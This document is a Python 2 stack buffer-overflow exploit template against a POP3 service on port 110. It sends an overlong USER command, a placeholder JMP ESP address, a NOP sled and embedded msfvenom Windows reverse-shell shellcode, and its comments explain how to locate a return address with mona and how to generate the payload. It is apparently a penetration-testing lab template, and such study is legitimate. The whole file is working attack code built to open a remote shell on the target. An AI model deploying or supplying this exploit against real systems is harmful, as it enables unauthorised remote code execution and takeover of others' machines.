#!/usr/bin/python

import sys, socket

#Variables
server = "192.168.253.129"
port = 110
command = "USER admin"
offset = 2606
nops = '\x90' * 32
shellcode = ("\xb8\xdf\x57\xa5\xec\xda\xc1\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x45\x12\x83\xed\xfc\x03\x9a\x59\x47\x19\xd8\x8e\x05"
"\xe2\x20\x4f\x6a\x6a\xc5\x7e\xaa\x08\x8e\xd1\x1a\x5a\xc2\xdd"
"\xd1\x0e\xf6\x56\x97\x86\xf9\xdf\x12\xf1\x34\xdf\x0f\xc1\x57"
"\x63\x52\x16\xb7\x5a\x9d\x6b\xb6\x9b\xc0\x86\xea\x74\x8e\x35"
"\x1a\xf0\xda\x85\x91\x4a\xca\x8d\x46\x1a\xed\xbc\xd9\x10\xb4"
"\x1e\xd8\xf5\xcc\x16\xc2\x1a\xe8\xe1\x79\xe8\x86\xf3\xab\x20"
"\x66\x5f\x92\x8c\x95\xa1\xd3\x2b\x46\xd4\x2d\x48\xfb\xef\xea"
"\x32\x27\x65\xe8\x95\xac\xdd\xd4\x24\x60\xbb\x9f\x2b\xcd\xcf"
"\xc7\x2f\xd0\x1c\x7c\x4b\x59\xa3\x52\xdd\x19\x80\x76\x85\xfa"
"\xa9\x2f\x63\xac\xd6\x2f\xcc\x11\x73\x24\xe1\x46\x0e\x67\x6e"
"\xaa\x23\x97\x6e\xa4\x34\xe4\x5c\x6b\xef\x62\xed\xe4\x29\x75"
"\x12\xdf\x8e\xe9\xed\xe0\xee\x20\x2a\xb4\xbe\x5a\x9b\xb5\x54"
"\x9a\x24\x60\xfa\xca\x8a\xdb\xbb\xba\x6a\x8c\x53\xd0\x64\xf3"
"\x44\xdb\xae\x9c\xef\x26\x39\x63\x47\xd5\x3b\x0b\x9a\x25\x2d"
"\x90\x13\xc3\x27\x38\x72\x5c\xd0\xa1\xdf\x16\x41\x2d\xca\x53"
"\x41\xa5\xf9\xa4\x0c\x4e\x77\xb6\xf9\xbe\xc2\xe4\xac\xc1\xf8"
"\x80\x33\x53\x67\x50\x3d\x48\x30\x07\x6a\xbe\x49\xcd\x86\x99"
"\xe3\xf3\x5a\x7f\xcb\xb7\x80\xbc\xd2\x36\x44\xf8\xf0\x28\x90"
"\x01\xbd\x1c\x4c\x54\x6b\xca\x2a\x0e\xdd\xa4\xe4\xfd\xb7\x20"
"\x70\xce\x07\x36\x7d\x1b\xfe\xd6\xcc\xf2\x47\xe9\xe1\x92\x4f"
"\x92\x1f\x03\xaf\x49\xa4\x23\x52\x5b\xd1\xcb\xcb\x0e\x58\x96"
"\xeb\xe5\x9f\xaf\x6f\x0f\x60\x54\x6f\x7a\x65\x10\x37\x97\x17"
"\x09\xd2\x97\x84\x2a\xf7")
#msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=8443 EXITFUNC=thread -f c -a x86 -b "\x00\OTHERBADCHARS"

#Buffer to send
buffer = "A" * offset
buffer += "\x00\x00\x00\x00"
#JMP ESP Address to replace = 00000000
#[!] DON'T FORGET LITTLE ENDIAN FOR 32BIT APPLICATIONS

#FINDING THE RIGHT MODULE IN IMMUNITY DEBUGGER
#!mona modules
#!mona find -s "\xff\xe4" -m module.dllname(all false with no bad chars in address)

#/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
#JMP ESP

#Try (if avalable)
try:

	#Connect Socket -- Connects to server declared in Variables above and receives incoming data from connected server
	print '[+] Connecting to Server'
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((server,port))
	s.recv(1024)
	print '[+] Server connected'

	#Send Command -- Sends command plus buffer (declared above) and carriage return/new line feed to connected server and then closes the socket if all data is sent/received
	print '[+] Sending command + buffer + nops + shellcode to server'
	s.send(command + buffer + nops + shellcode + '\r\n')
	s.recv(1024)
	s.close()

#Exception Handling (if unavalable)
except:

	#Print Error Connecting to server and to check settings
	print '[!] Cannot connect to server or command canceled. Please check the server application and settings in this script'
	sys.exit()
